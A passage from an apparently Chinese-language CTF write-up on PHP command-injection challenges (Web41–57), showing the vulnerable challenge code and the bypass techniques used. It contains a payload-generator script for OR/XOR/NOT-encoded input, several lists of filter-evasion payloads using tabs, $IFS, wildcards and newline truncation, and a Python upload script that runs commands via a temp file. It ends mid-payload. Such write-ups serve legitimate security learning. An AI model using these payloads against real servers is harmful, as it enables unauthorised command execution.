punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此题过滤了<code>$、+、-、^、~</code>，导致异或/自增/取反构造字符都无法在使用，但留了个运算符<code>|</code></p><p>脚本：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Y4tacker# @Date:   2020-11-21 20:31:22*/</span><span class="token comment">/*根据正则表达式生成对应payload */</span><span class="token comment">//或</span><span class="token keyword">function</span> <span class="token function-definition function">orRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//异或</span><span class="token keyword">function</span> <span class="token function-definition function">xorRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//取反</span><span class="token keyword">function</span> <span class="token function-definition function">negateRce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'[+]your function: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$system</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'[+]your command: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'[*] (~'</span> <span class="token operator">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$system</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')(~'</span> <span class="token operator">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$command</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//mode=1代表或，2代表异或，3代表取反</span><span class="token comment">//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式</span><span class="token keyword">function</span> <span class="token function-definition function">generate</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">,</span> <span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9]/i'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//根据正则表达式从字符中排除掉被过滤的，然后再进行或/异或，之后判断该字符是否为可见字符</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$hex_i</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span> <span class="token operator">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$hex_i</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$hex_j</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span> <span class="token operator">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$hex_j</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$par1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"%"</span> <span class="token operator">.</span> <span class="token variable">$hex_i</span><span class="token punctuation">;</span>                    <span class="token variable">$par2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'%'</span> <span class="token operator">.</span> <span class="token variable">$hex_j</span><span class="token punctuation">;</span>                    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">orRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">xorRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token variable">$contents</span> <span class="token operator">.</span> <span class="token variable">$res</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$par1</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$par2</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">negateRce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">generate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web42-52-gt-dev-null"><a href="#Web42-52-gt-dev-null" class="headerlink" title="Web42-52 &gt;/dev/null"></a>Web42-52 &gt;/dev/null</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>/dev/null 2&gt;&amp;1，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p></blockquote><p>要将后面的截断,命令加个<code>%0a</code>或者<code>%26</code>或<code>||</code></p><p><strong>Web43</strong>新增正则检测cat，换个如<code>nl</code>、<code>tac</code>读取命令即可</p><p><strong>Web44</strong>新增正则检测flag，用通配符或<code>fla\g</code></p><p><strong>Web45</strong>新增正则检测空格，可用<code>%09</code>代替空格，或<code>nl&lt;fl\ag.php||</code></p><p><strong>Web46</strong>新增[0-9]|$，同上</p><p><strong>Web47</strong>同上</p><p><strong>Web48</strong>同上</p><p><strong>Web49</strong>新增各种命令，同上</p><p><strong>Web50</strong>新增检测<code>%09</code></p><p><strong>Web51</strong>新增检测<code>%</code></p><p><strong>Web52</strong>新增检测大多数可代替空格字符，但没检测<code>$</code>，所以用$IFS代替空格</p><pre class="line-numbers language-none"><code class="language-none">payload1:c&#x3D;nl%09fla\g.php||payload2:c&#x3D;nl%09fla\g.php%0apayload3:c&#x3D;nl%09fla&#39;&#39;g.php%0apayload4:c&#x3D;nl%09fla&quot;&quot;g.php%0apayload5:c&#x3D;vi%09fla\g.php%0apayload6:c&#x3D;tac%09fla\g.php%0apayload7:c&#x3D;uniq%09fla\g.php%0apayload8:c&#x3D;nl&lt;fla&#39;&#39;g.php||payload9:c&#x3D;nl%09fla\g.php%26<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web53-54"><a href="#Web53-54" class="headerlink" title="Web53-54"></a>Web53-54</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\|\;|cat|f1ag|[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk| strings|od|curl|\`|\%|\xO9|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span> <span class="token operator">.</span> <span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?c&#x3D;nl$&#123;IFS&#125;fla\g.php&amp;?c&#x3D;c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>Web54</strong>加了一大堆<code>.*f</code>这等检测，用通配符</p><h2 id="Web55-56-a-z"><a href="#Web55-56-a-z" class="headerlink" title="Web55-56:[a-z]"></a>Web55-56:[a-z]</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>bin为binary的简写主要放置一些linux的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</p></blockquote><p>payload:</p><p>方法一：</p><p>匹配/bin/base64 /flag.php</p><pre class="line-numbers language-none"><code class="language-none">?c&#x3D;&#x2F;???&#x2F;????64%20????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>非通用，base64并非每个机子都有</p><h3 id="上传临时变量"><a href="#上传临时变量" class="headerlink" title="上传临时变量"></a>上传临时变量</h3><p>参考链接：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://url/?c=.+/???/????????[@-[]"</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span> <span class="token string">b'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token comment">#可以考虑加个声明 b'#!/bin/sh\ncat flag.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Web56</strong>加了[0-9]，同上</p><h2 id="Web57"><a href="#Web57" class="headerlink" title="Web57"></a>Web57</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in 36.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat "</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目的是构造36这个数字，利用</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;与网上wp结果不一致，在kali与ubuntu18环境下测试为如下结果$(()) 是0$((~37)) 是-38,$((~$(())$(()))) 是-1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span 